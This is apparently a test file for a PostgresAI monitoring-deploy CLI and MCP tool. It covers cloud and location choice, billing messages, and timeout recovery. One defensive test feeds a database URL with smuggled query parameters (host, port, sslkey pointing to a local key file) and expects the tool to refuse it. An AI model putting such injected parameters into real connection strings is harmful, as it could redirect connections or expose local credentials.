  test("a database that cannot be reached: the agent is told so, and no price is quoted first", async () => {
    const quotes: unknown[] = [];
    const connection = spyOn(Client.prototype, "connect").mockImplementation(() => { throw new Error("offline connection refused"); });
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      async fetch(req) {
        const path = new URL(req.url).pathname;
        if (path.endsWith("/rpc/cloud_monitoring_list")) return Response.json([]);
        if (path.endsWith("/rpc/cloud_monitoring_quote")) { quotes.push(await req.json()); return Response.json({}); }
        return new Response("not found", { status: 404 });
      },
    });
    const opts = { apiKey: "k", apiBaseUrl: `http://127.0.0.1:${server.port}`, uiBaseUrl: "https://console.example" };
    try {
      const result = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: "postgresql://postgres:pw@db.example.invalid:5432/app", yes: true } } }, opts);
      expect(result.isError).toBe(true);
      expect(quotes).toEqual([]);
    } finally {
      server.stop(true);
      connection.mockRestore();
    }
  });

  test("query parameters pg would obey (host, port, certificate files) are refused before anything is contacted", async () => {
    const opts = { apiKey: "k", apiBaseUrl: "http://127.0.0.1:9", uiBaseUrl: "https://console.example" };
    const result = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: "postgresql://postgres:pw@db.example.invalid:5432/postgres?host=127.0.0.1&port=32785&sslkey=/home/u/key.pem" } } }, opts);
    expect(result).toEqual({ content: [{ type: "text", text: "database_url may carry only these query parameters: sslmode, channel_binding, application_name (got: host, port, sslkey)" }], isError: true });
  });

  test("the URL must carry its password: nothing of this machine (PGPASSWORD) is sent to a host an agent chose", async () => {
    const opts = { apiKey: "k", apiBaseUrl: "http://127.0.0.1:9", uiBaseUrl: "https://console.example" };
    for (const database_url of ["postgresql://postgres@db.example.com:5432/app", "host=db dbname=app", undefined]) {
      const result = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url } } }, opts);
      expect(result).toEqual({ content: [{ type: "text", text: "database_url must be postgresql://user:password@host:5432/dbname, with the password in it" }], isError: true });
    }
  });

  test.each(["password=x&password=", "password=&password=x"])("duplicate password parameters are refused by the MCP tool: %s", async (query) => {
    const requests: string[] = [];
    const fetch = spyOn(globalThis, "fetch").mockImplementation((async (input: string | URL | Request) => {
      requests.push(String(input));
      return Response.json([row("active", { name: "db.example.com/app" })]);
    }) as typeof globalThis.fetch);
    const connection = spyOn(Client.prototype, "connect").mockImplementation(() => { throw new Error("offline stop"); });
    try {
      const result = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: `postgresql://postgres@db.example.com/app?${query}` } } }, { apiKey: "k", apiBaseUrl: "https://api.example", uiBaseUrl: "https://console.example" });
      expect(result).toEqual({ content: [{ type: "text", text: "database_url query parameter password must appear only once" }], isError: true });
      expect(requests).toEqual([]);
    } finally {
      fetch.mockRestore();
      connection.mockRestore();
    }
  });
});

test("debug logs never carry the database URL or the ClickHouse key secret", () => {
  const { redactSecretsForLog } = require("../lib/util");
  const out = redactSecretsForLog(JSON.stringify({ db_url: MON, clickhouse_key_id: "kid", clickhouse_key_secret: "Sec4b1d" }));
  expect(out).not.toContain("genpw");
  expect(out).not.toContain("Sec4b1d");
  expect(out).toContain("kid");
});

test("sslmode in the URL wins over PGSSLMODE, as in libpq; PGSSLMODE applies to a URL without one", () => {
  process.env.PGSSLMODE = "disable";
  try {
    const strict = resolveAdminConnection({ conn: "postgresql://u:p@h:5432/d?sslmode=verify-full" });
    expect(strict.clientConfig.ssl).toBe(true);
    expect(strict.sslFallbackEnabled).toBe(false);
    expect(resolveAdminConnection({ conn: "postgresql://u:p@h:5432/d" }).clientConfig.ssl).toBe(false);
  } finally {
    delete process.env.PGSSLMODE;
  }
});

describe("mon instances delete: what happened to the billing", () => {
  test("the last box: the subscription is canceled; another box left: how many remain; a failure is said; nothing released: nothing", () => {
    expect(disconnectBilling({ billing: { subscription: "canceled", quantity: 0 } })).toBe("subscription canceled: no further charges; the unused part of this period is credited (prorated)");
    expect(disconnectBilling({ billing: { subscription: "canceled" } })).toBe("subscription canceled: no further charges; the unused part of this period is credited (prorated)");
    expect(disconnectBilling({ billing: { subscription: "active", quantity: 2 } })).toBe("2 database clusters left on the subscription");
    expect(disconnectBilling({ billing: { subscription: "active", quantity: 1 } })).toBe("1 database cluster left on the subscription");
    expect(disconnectBilling({ billing_warning: "Failed to cancel org subscription: stripe down" })).toBe("not released (Failed to cancel org subscription: stripe down): contact support");
    // The last cluster: the unused time goes back to the card (or stays as credit when the refund failed).
    expect(disconnectBilling({ billing: { subscription: "canceled", quantity: 0, refunded: 49907, currency: "usd" } })).toBe("subscription canceled: no further charges; refunded $499.07 to your card");
    expect(disconnectBilling({ billing: { subscription: "canceled", quantity: 0, credited: true }, billing_warning: "The refund failed: card expired. The unused time stays as account credit." }))
      .toBe("subscription canceled: no further charges; the refund failed (The refund failed: card expired. The unused time stays as account credit.)");
    expect(disconnectBilling({})).toBeUndefined();
    expect(disconnectBilling(null)).toBeUndefined();
  });
});

describe("errorText", () => {
  // node's connect tries every address of a host name (IPv6 and IPv4) and,
  // when all refuse, throws an AggregateError whose own message is empty.
  test("an AggregateError with no message says what each attempt got", () => {
    const err = Object.assign(new AggregateError([
      Object.assign(new Error("connect ECONNREFUSED 2001:db8::1:25499"), { code: "ECONNREFUSED" }),
      Object.assign(new Error("connect ECONNREFUSED 192.0.2.1:25499"), { code: "ECONNREFUSED" }),
    ], ""), { code: "ECONNREFUSED" });
    expect(errorText(err)).toBe("connect ECONNREFUSED 2001:db8::1:25499; connect ECONNREFUSED 192.0.2.1:25499");
  });

  test("an error with a message, and a non-error, as before", () => {
    expect(errorText(new Error("boom"))).toBe("boom");
    expect(errorText("plain")).toBe("plain");
  });
});

describe("where the box runs: the platform decides (platform-all#972)", () => {
  // A Postgres on EC2 (an RDS URL is finished in the console, before any of this).
  const RDS = "postgresql://postgres:adminpw@ec2-3-15-1-2.us-east-2.compute.amazonaws.com:5432/app";
  const choice = (cloud: string, location: string, reason: string, reason_text: string) => ({
    clouds: [{ code: "aws", label: "AWS", available: true }, { code: "hetzner", label: "Hetzner", available: true }],
    locations: { aws: [{ code: "us-east-1", label: "US East", world_part: "North America" }], hetzner: [{ code: "fsn1", label: "DE Falkenstein", world_part: "Europe" }] },
    choice: { cloud, cloud_label: cloud === "aws" ? "AWS" : "Hetzner", location, location_label: null, reason, reason_text },
    error: null,
  });

  test("asked with the host only, before the price and the role; shown, then sent with the box request", async () => {
    const lines: string[] = [];
    const f = fake({ progress: (e) => lines.push(e.message) });
    f.deps.quote = async () => { f.calls.push("quote"); return FREE_QUOTE; };
    f.deps.deployOptions = async (args) => { f.calls.push(`options ${JSON.stringify(args)}`); return choice("aws", "us-east-2", "source_region", "same region as your database"); };
    const result = await connect(RDS, { waitMs: 0, vcpus: 2, yes: true }, f.deps);
    expect(f.calls.slice(0, 4)).toEqual(["list", "check self-managed",
      `options ${JSON.stringify({ db_host: "ec2-3-15-1-2.us-east-2.compute.amazonaws.com", check_stock: true })}`, "quote"]);
    expect(f.calls.find((c) => c.startsWith("options"))).not.toContain("adminpw");
    expect(f.calls.find((c) => c.startsWith("create "))).toContain(`"cloud":"aws","server_location":"us-east-2"`);
    expect(lines[0]).toBe("Monitoring box: AWS, us-east-2 (same region as your database)");
    expect(result).toMatchObject({ status: "in_progress", cloud: "aws", location: "us-east-2", location_reason: "source_region" });
  });

  test("a refusal is exit 1 before the price and before the role: nothing is created", async () => {
    const f = fake();
    f.deps.deployOptions = async () => ({ ...choice("aws", "", "", ""), choice: null,
      error: { code: "PT400", message: "Bad Request", detail: 'AWS has no location "fsn1" (it is a Hetzner location). Choose one of: us-east-1.', hint: "Nothing was created." } });
    await expect(connect(RDS, { waitMs: 0, location: "fsn1" }, f.deps)).rejects.toThrow(
      'AWS has no location "fsn1" (it is a Hetzner location). Choose one of: us-east-1. Add --cloud hetzner. Nothing was created.');
    expect(f.calls).toEqual(["list", "check self-managed"]);
  });

  test("a cloud not available here names --cloud", async () => {
    const f = fake();
    f.deps.deployOptions = async () => ({ ...choice("aws", "", "", ""), choice: null,
      clouds: [{ code: "aws", label: "AWS", available: false }, { code: "hetzner", label: "Hetzner", available: true }],
      error: { code: "PT400", message: "Bad Request", detail: "Monitoring on AWS is not available here (it is the default). Choose one of: Hetzner.", hint: null } });
    await expect(connect(RDS, { waitMs: 0 }, f.deps)).rejects.toThrow(
      "Monitoring on AWS is not available here (it is the default). Choose one of: Hetzner. Re-run with --cloud hetzner. Nothing was created.");
  });

  test("a stop after the place (no payment method) still says where the box would run", async () => {
    const f = fake();
    f.deps.quote = async () => ({ ...FREE_QUOTE, billed: true, free_slots: { remaining: 0, total: 0 }, has_payment_method: false, requires_payment_method: true,
      price: { amount: 51200, currency: "usd", interval: "month" }, org_alias: "acme" } as never);
    f.deps.deployOptions = async () => choice("aws", "us-east-2", "source_region", "same region as your database");
    const result = await connect(RDS, { waitMs: 0, vcpus: 2, yes: true }, f.deps);
    expect(result).toMatchObject({ status: "action_required", cloud: "aws", location: "us-east-2", location_reason: "source_region" });
    expect(f.calls.some((c) => c.startsWith("create "))).toBe(false);
  });

  test("a platform from before --cloud: the box goes where it puts it; --cloud itself is refused", async () => {
    const notFound = Object.assign(new Error("Not Found"), { status: 404 });
    const f = fake();
    f.deps.deployOptions = async () => { throw notFound; };
    expect((await connect(RDS, { waitMs: 0, vcpus: 2 }, f.deps)).status).toBe("in_progress");
    expect(f.calls.find((c) => c.startsWith("create "))).not.toContain('"cloud"');
    const g = fake();
    g.deps.deployOptions = async () => { throw notFound; };
    await expect(connect(RDS, { waitMs: 0, cloud: "hetzner" }, g.deps)).rejects.toThrow("This PostgresAI platform does not take --cloud yet");
  });

  // A17: without --yes, nobody deploys where the platform put the box without being asked.
  const both = () => ({ ...choice("aws", "us-east-1", "default", "default: we could not tell where your database runs"),
    locations: {
      aws: [{ code: "us-east-1", label: "US East (N. Virginia)", world_part: "North America" }, { code: "eu-central-1", label: "Europe (Frankfurt)", world_part: "Europe" }],
      hetzner: [{ code: "fsn1", label: "DE Falkenstein", world_part: "Europe" }, { code: "ash", label: "US Ashburn", world_part: "North America" }],
    } });

  test("nobody to ask (piped, --json): the place, the price and the choices come back, nothing is created", async () => {
    const f = fake();
    f.deps.quote = async () => { f.calls.push("quote"); return FREE_QUOTE; };
    f.deps.deployOptions = async () => both();
    const result = await connect(RDS, { waitMs: 0, vcpus: 2 }, f.deps);
    expect(result).toMatchObject({
      status: "action_required", cloud: "aws", location: "us-east-1", location_reason: "default",
      location_reason_text: "default: we could not tell where your database runs",
      choices: { aws: ["us-east-1", "eu-central-1"], hetzner: ["fsn1", "ash"] },
    });
    expect(result.next).toContain("re-run with --yes to deploy there, or with --cloud and --location (choices below) and --yes. Nothing was created.");
    expect(f.calls.some((c) => c.startsWith("prepare ") || c.startsWith("create "))).toBe(false);
    expect(resultLines(result)).toContain("  --cloud hetzner --location fsn1|ash");
  });

  test("an agent is told to show the user the place and price, and how to call again", async () => {
    const f = fake();
    f.deps.quote = async () => FREE_QUOTE;
    f.deps.deployOptions = async () => both();
    const result = await connect(RDS, { waitMs: 0, vcpus: 2, agent: true }, f.deps);
    expect(result.status).toBe("action_required");
    expect(result.next).toMatch(/^Show the user where the monitoring box would run \(AWS, us-east-1 \(default: .*\)\) and the price \(free .*\), then call deploy_monitoring again with yes: true, or with cloud and location from choices and yes: true\. Nothing was created\.$/);
  });

  test("a person who says yes deploys where shown, free box included", async () => {
    const f = fake();
    f.deps.quote = async () => FREE_QUOTE;
    f.deps.deployOptions = async () => both();
    f.deps.choosePlace = async () => true;
    expect((await connect(RDS, { waitMs: 0, vcpus: 2 }, f.deps)).status).toBe("in_progress");
    expect(f.calls.find((c) => c.startsWith("create "))).toContain(`"cloud":"aws","server_location":"us-east-1"`);
  });

  test("a person who picks another place: the platform places it again, and that is what is created", async () => {
    const lines: string[] = [];
    const f = fake({ progress: (e) => lines.push(e.message) });
    f.deps.quote = async () => FREE_QUOTE;
    const asked: unknown[] = [];
    f.deps.deployOptions = async (args) => {
      asked.push(args);
      return args.cloud === "hetzner" ? choice("hetzner", "fsn1", "explicit", "your choice") : both();
    };
    f.deps.choosePlace = async () => ({ cloud: "hetzner", location: "fsn1" });
    const result = await connect(RDS, { waitMs: 0, vcpus: 2 }, f.deps);
    expect(asked[1]).toMatchObject({ cloud: "hetzner", location: "fsn1", check_stock: true });
    expect(f.calls.find((c) => c.startsWith("create "))).toContain(`"cloud":"hetzner","server_location":"fsn1"`);
    expect(result).toMatchObject({ status: "in_progress", cloud: "hetzner", location: "fsn1", location_reason: "explicit" });
    expect(lines).toContain("Monitoring box: Hetzner, fsn1 (your choice)");
    expect(lines).toContain("Next time, to skip this question: --cloud hetzner --location fsn1 --yes");
  });

  // REV r3 on !510: the picked place is confirmed on a plain line, and no step view starts before the vCPUs question.
  test("after a pick at a terminal: the new place and the hint are plain lines, the step view waits for the vCPUs answer", async () => {
    const out: string[] = [];
    let started = 0;
    const view = { start: () => { started++; }, advance: () => {}, log: () => {}, setNote: () => {}, complete: () => {}, fail: () => {}, stop: () => {} };
    const steps = stepProgress({ json: false, tty: true, makeView: () => view, writeLine: (l) => out.push(l), writeEvent: () => {} });
    const f = fake({ progress: steps.progress });
    f.deps.quote = async () => FREE_QUOTE;
    f.deps.deployOptions = async (args) => args.cloud === "hetzner" ? choice("hetzner", "fsn1", "explicit", "your choice") : both();
    f.deps.choosePlace = async () => ({ cloud: "hetzner", location: "fsn1" });
    let viewsAtVcpus = -1;
    f.deps.askVcpus = async () => { viewsAtVcpus = started; return 2; };
    await connect(RDS, { waitMs: 0 }, f.deps);
    expect(viewsAtVcpus).toBe(0);
    expect(out).toContain("Monitoring box: Hetzner, fsn1 (your choice)");
    expect(out).toContain("Next time, to skip this question: --cloud hetzner --location fsn1 --yes");
  });

  test("choices list the clouds the picker offers: none without locations", async () => {
    const f = fake();
    f.deps.quote = async () => FREE_QUOTE;
    f.deps.deployOptions = async () => ({ ...both(), clouds: [...both().clouds, { code: "gcp", label: "Google Cloud", available: true }] });
    expect((await connect(RDS, { waitMs: 0, vcpus: 2 }, f.deps)).choices).toEqual({ aws: ["us-east-1", "eu-central-1"], hetzner: ["fsn1", "ash"] });
  });

  test("a person who says no: nothing is created", async () => {
    const f = fake();
    f.deps.quote = async () => FREE_QUOTE;
    f.deps.deployOptions = async () => both();
    f.deps.choosePlace = async () => false;
    const result = await connect(RDS, { waitMs: 0, vcpus: 2 }, f.deps);
    expect(result).toMatchObject({ status: "action_required", cloud: "aws", location: "us-east-1" });
    expect(result.next).toBe("Nothing was created: re-run to deploy, with --cloud and --location to choose where");
    expect(f.calls.some((c) => c.startsWith("prepare ") || c.startsWith("create "))).toBe(false);
  });

  test("with --cloud/--location a person is asked once, with no picker; a billed box is accepted by that answer", async () => {
    const f = fake();
    const questions: string[] = [];
    f.deps.quote = async () => ({ ...FREE_QUOTE, billed: true, free_slots: { remaining: 0, total: 0 }, price: { amount: 50000, currency: "usd", interval: "month" } } as never);
    f.deps.deployOptions = async () => choice("hetzner", "fsn1", "explicit", "your choice");
    f.deps.choosePlace = async () => { throw new Error("no picker with --cloud/--location"); };
    f.deps.confirm = async (q) => { questions.push(q); return true; };
    await connect(RDS, { waitMs: 0, vcpus: 2, cloud: "hetzner", location: "fsn1" }, f.deps);
    expect(questions).toEqual(["Deploy ec2-3-15-1-2.us-east-2.compute.amazonaws.com/app on Hetzner, fsn1? [y/N] "]);
    expect(f.calls.find((c) => c.startsWith("create "))).toContain(`"accept_price":true`);
  });
});

describe("pickPlace: the terminal's question (A17)", () => {
  const options = {
    clouds: [{ code: "aws", label: "AWS", available: true }, { code: "hetzner", label: "Hetzner", available: true }, { code: "gcp", label: "Google Cloud", available: false }],
    locations: { aws: [{ code: "us-east-1", label: "US East", world_part: "North America" }], hetzner: [{ code: "fsn1", label: "DE Falkenstein", world_part: "Europe" }, { code: "ash", label: "US Ashburn", world_part: "North America" }] },
    choice: null, error: null,
  };
  const run = async (answers: string[]) => {
    const said: string[] = [];
    const asked: string[] = [];
    const r = await pickPlace(options, "db", async (q) => { asked.push(q); return answers.shift() ?? ""; }, (l) => said.push(l));
    return { r, said, asked };
  };
  test("y deploys here; Enter and n do not", async () => {
    expect((await run(["y"])).r).toBe(true);
    expect((await run([""])).r).toBe(false);
    expect((await run(["n"])).r).toBe(false);
    expect((await run(["y"])).asked[0]).toBe("Deploy db here? [y]es / [c]hoose another location / [N]o: ");
  });
  test("c lists the available clouds, then that cloud's locations by world part", async () => {
    const { r, said } = await run(["c", "2", "2"]);
    expect(r).toEqual({ cloud: "hetzner", location: "ash" });
    expect(said).toEqual(["Clouds:", "  1. AWS", "  2. Hetzner", "Locations on Hetzner:", "  Europe", "    1. fsn1  DE Falkenstein", "  North America", "    2. ash  US Ashburn"]);
  });
  test("a wrong number is asked again; Enter at a list cancels", async () => {
    expect((await run(["c", "9", "1", "1"])).r).toEqual({ cloud: "aws", location: "us-east-1" });
    expect((await run(["c", ""])).r).toBe(false);
    expect((await run(["x", "x", "x"])).r).toBe(false);
  });
});

// The box request got no answer (a timeout, a 5xx): the platform may still be
// creating the box, so deploy looks for it before it says anything (postgresai#443).
describe("a box request without an answer", () => {
  const TIMEOUT = new HttpRequestTimeoutError("cloud monitoring connect", CONNECT_TIMEOUT_MS);
  const made = (status: string, extra: Partial<Database> = {}) =>
    row(status, { id: "i-7", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: "postgres", ...extra });

  test("the box appears: the step goes on, and deploy follows it", async () => {
    const messages: string[] = [];
    const f = fake({ ...clock(), rows: [undefined, undefined, made("launch_requested")],
      create: async () => { throw TIMEOUT; }, progress: (e) => { messages.push(e.message); } });
    const result = await connect(CH, { waitMs: 0 }, f.deps);
    expect(result).toMatchObject({ status: "in_progress", id: "i-7" });
    expect(messages).toContain(STILL_CREATING);
    // The first look misses, then one poll later the row is there.
    expect(f.calls.filter((c) => c === "list").length).toBeGreaterThanOrEqual(3);
    expect(f.calls).not.toContain("unprepare");
  });

  test("a proxy's 504 is no answer too", async () => {
    const f = fake({ ...clock(), rows: [undefined, made("launch_requested")],
      create: async () => { throw new HttpStatusError("Failed to cloud monitoring connect (HTTP 504)", 504); } });
    expect((await connect(CH, { waitMs: 0 }, f.deps)).id).toBe("i-7");
  });

  test("no box after 5 minutes: not confirmed (exit 3), the role and the server lease stay", async () => {
    const c = clock();
    const f = fake({ now: c.now, sleep: c.sleep, prepare: async () => ({ monitoringUrl: MON, generated: true }), create: async () => { throw TIMEOUT; } });
    expect(await connect(CH, { waitMs: 0, resetPassword: true }, f.deps)).toMatchObject({ status: "action_required", provider: "clickhouse", name: CH_NAME, next: NOT_CONFIRMED });
    // One look at once, then every 15 s for 5 minutes.
    expect(c.naps()).toBe(20);
    expect(f.calls).not.toContain("unprepare");
    expect(f.calls).not.toContain("resetUnlock l-1");
  });

  test("an agent's run, steps before the request included, ends its look 50 s in (a tool call must answer within 60 s)", async () => {
    // Slow steps before the request (prepare took 10 s): the look gets what is left, and the
    // last check lands at 50 s into the run, not up to a poll (15 s) later.
    const slow = clock();
    const late = fake({ now: slow.now, sleep: slow.sleep, create: async () => { throw TIMEOUT; },
      prepare: async (_u, _p, o) => { if (!o?.check) await slow.sleep(10_000); return o?.check ? { checked: true } : { monitoringUrl: MON }; } });
    await connect(CH, { waitMs: 0, agent: true }, late.deps);
    expect(slow.now()).toBe(50_000);
    const c = clock();
    const f = fake({ now: c.now, sleep: c.sleep, create: async () => { throw TIMEOUT; } });
    expect((await connect(CH, { waitMs: 0, agent: true }, f.deps)).next).toBe("PostgresAI did not confirm the monitoring box yet. Call deploy_monitoring again in a minute: it continues with the box if PostgresAI created it. If pgai mon instances list still has no box for this database, ask the user to run pgai mon deploy with --reset-password in a terminal");
    expect(c.naps()).toBe(4);
  });

  test("found, but the platform refused and undid the launch: failed, and the generated role is dropped", async () => {
    const f = fake({ ...clock(), rows: [undefined, made("deleting")], prepare: async () => ({ monitoringUrl: MON, generated: true }),
      create: async () => { throw TIMEOUT; } });
    expect(await connect(CH, { waitMs: 0 }, f.deps)).toEqual({ status: "failed", provider: "clickhouse", name: CH_NAME, id: "i-7",
      next: "PostgresAI could not launch the monitoring box. Re-run pgai mon deploy later." });
    expect(f.calls).toContain("unprepare");
  });

  test("--reset-password: the lock is released once the box is found, or found refused; kept while unconfirmed", async () => {
    const live = fake({ ...clock(), rows: [undefined, undefined, undefined, made("launch_requested")], create: async () => { throw TIMEOUT; } });
    expect((await connect(CH, { waitMs: 0, resetPassword: true }, live.deps)).id).toBe("i-7");
    expect(live.calls).toContain("resetUnlock l-1");
    const refused = fake({ ...clock(), rows: [undefined, undefined, made("deleting")], prepare: async () => ({ monitoringUrl: MON, generated: true }),
      create: async () => { throw TIMEOUT; } });
    expect((await connect(CH, { waitMs: 0, resetPassword: true }, refused.deps)).status).toBe("failed");
    expect(refused.calls).toEqual(expect.arrayContaining(["unprepare", "resetUnlock l-1"]));
  });

  test("a refused box whose destroy failed too (deleting_failed_to_launch) is failed, not followed", async () => {
    const f = fake({ ...clock(), rows: [undefined, made("deleting_failed_to_launch")], prepare: async () => ({ monitoringUrl: MON, generated: true }),
      create: async () => { throw TIMEOUT; } });
    expect(await connect(CH, { waitMs: 0 }, f.deps)).toMatchObject({ status: "failed",
      next: "PostgresAI could not launch the monitoring box. Run pgai mon instances delete i-7 --yes, then pgai mon deploy again." });
    expect(f.calls).toContain("unprepare");
  });

  test("a box of this database from before is not taken for the new one", async () => {
    const old = made("deleting", { id: "i-old" });
    const f = fake({ ...clock(), rows: [old], create: async () => { throw TIMEOUT; } });
    expect((await connect(CH, { waitMs: 0 }, f.deps)).next).toBe(NOT_CONFIRMED);
  });

  test("Ctrl-C while looking: stops at once; still in progress, not a failure", async () => {
    const c = clock();
    let looking = false;
    const f = fake({ now: c.now, sleep: c.sleep, create: async () => { looking = true; throw TIMEOUT; }, aborted: () => looking });
    expect((await connect(CH, { waitMs: 0 }, f.deps)).next).toBe("Still in progress: deploy stopped watching before PostgresAI confirmed the monitoring box; it may still appear. Run pgai mon instances list before running deploy again");
    expect(c.naps()).toBe(0);
  });

  test("a failing list is a miss, not the end", async () => {
    let n = 0;
    const f = fake({ ...clock(), create: async () => { throw TIMEOUT; } });
    f.deps.list = async () => { n++; if (n === 2) throw new Error("cloud monitoring list: HTTP 502"); return n >= 3 ? [made("launch_requested")] : []; };
    expect((await connect(CH, { waitMs: 0 }, f.deps)).id).toBe("i-7");
  });

  test("a 5xx the platform raised (PT503) is its answer: its reason at once, no waiting", async () => {
    const c = clock();
    const refusal = new HttpStatusError("cloud monitoring connect: Deploys to PostgresAI cloud are unavailable right now. Try again later.", 503, "PT503");
    const f = fake({ now: c.now, sleep: c.sleep, prepare: async () => ({ monitoringUrl: MON, generated: true }), create: async () => { throw refusal; } });
    await expect(connect(CH, { waitMs: 0, resetPassword: true }, f.deps)).rejects.toThrow("Deploys to PostgresAI cloud are unavailable right now");
    expect(c.naps()).toBe(0);
    // Nothing was created: the generated role goes and the server lock is released.
    expect(f.calls).toEqual(expect.arrayContaining(["unprepare", "resetUnlock l-1"]));
  });

  test("callRpc keeps the SQLSTATE of a PostgREST error, none for a proxy's page", async () => {
    const realFetch = globalThis.fetch;
    const bodies = [
      new Response(JSON.stringify({ code: "PT503", message: "Service Unavailable", details: "Deploys to PostgresAI cloud are unavailable right now." }), { status: 503 }),
      new Response("<html>504 Gateway Time-out</html>", { status: 504 }),
    ];
    globalThis.fetch = (async () => bodies.shift()!) as unknown as typeof fetch;
    const deps = platformDeps({ apiKey: "k", apiBaseUrl: "https://example.test/api/general", uiBaseUrl: "https://example.test" });
    try {
      const answered = await deps.create({ db_url: "postgresql://x" }).catch((e) => e);
      const proxied = await deps.create({ db_url: "postgresql://x" }).catch((e) => e);
      expect([answered.status, answered.sqlstate, mayHaveRun(answered)]).toEqual([503, "PT503", false]);
      expect([proxied.status, proxied.sqlstate, mayHaveRun(proxied)]).toEqual([504, undefined, true]);
    } finally {
      globalThis.fetch = realFetch;
    }
  });

  test("what may have run", () => {
    expect(mayHaveRun(TIMEOUT)).toBe(true);
    expect(mayHaveRun(new HttpStatusError("x", 502))).toBe(true);
    expect(mayHaveRun(new HttpStatusError("x", 524))).toBe(true);
    expect(mayHaveRun(new HttpStatusError("x", 503, "PT503"))).toBe(false);
    expect(mayHaveRun(new HttpStatusError("x", 409))).toBe(false);
    expect(mayHaveRun(new Error("cloud monitoring connect: could not reach https://postgres.ai/api/general (ECONNRESET)"))).toBe(true);
    expect(mayHaveRun(new Error("cloud monitoring connect: could not reach https://postgres.ai/api/general (ECONNREFUSED)"))).toBe(false);
    expect(mayHaveRun(new Error("cloud monitoring connect: could not reach https://postgres.ai/api/general (ENOTFOUND)"))).toBe(false);
    expect(mayHaveRun(new Error("timed out"))).toBe(false);
    for (const code of ["ETIMEDOUT", "UND_ERR_CONNECT_TIMEOUT", "CERT_HAS_EXPIRED", "ERR_TLS_CERT_ALTNAME_INVALID", "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "SELF_SIGNED_CERT_IN_CHAIN"]) {
      expect(mayHaveRun(new Error(`cloud monitoring connect: could not reach https://postgres.ai/api/general (${code})`))).toBe(false);
    }
  });

  test("only the box request waits 55 s; the other calls keep 25 s", async () => {
    const seen: Record<string, number> = {};
    const realFetch = globalThis.fetch;
    const realTimeout = AbortSignal.timeout;
    let last = 0;
    AbortSignal.timeout = (ms: number) => { last = ms; return realTimeout.call(AbortSignal, ms); };
    globalThis.fetch = (async (url: string) => { seen[String(url).split("/").pop()!] = last; return Response.json({ id: "i-1", name: "x", status: "launch_requested" }); }) as typeof fetch;
    try {
      const deps = platformDeps({ apiKey: "k", apiBaseUrl: "https://example.test/api/general", uiBaseUrl: "https://example.test" });
      await deps.create({ db_url: "postgresql://x" });
      await deps.list();
    } finally {
      globalThis.fetch = realFetch;
      AbortSignal.timeout = realTimeout;
    }
    expect(seen).toEqual({ cloud_monitoring_connect: 55_000, cloud_monitoring_list: 25_000 });
    // The MCP tool (agent) keeps 25 s for the request, so the whole call fits in 60 s.
    AbortSignal.timeout = (ms: number) => { last = ms; return realTimeout.call(AbortSignal, ms); };
    globalThis.fetch = (async (url: string) => { seen[String(url).split("/").pop()!] = last; return Response.json({ id: "i-1", name: "x", status: "launch_requested" }); }) as typeof fetch;
    try {
      await platformDeps({ apiKey: "k", apiBaseUrl: "https://example.test/api/general", uiBaseUrl: "https://example.test", agent: true }).create({ db_url: "postgresql://x" });
    } finally {
      globalThis.fetch = realFetch;
      AbortSignal.timeout = realTimeout;
    }
    expect(seen.cloud_monitoring_connect).toBe(25_000);
  });
});
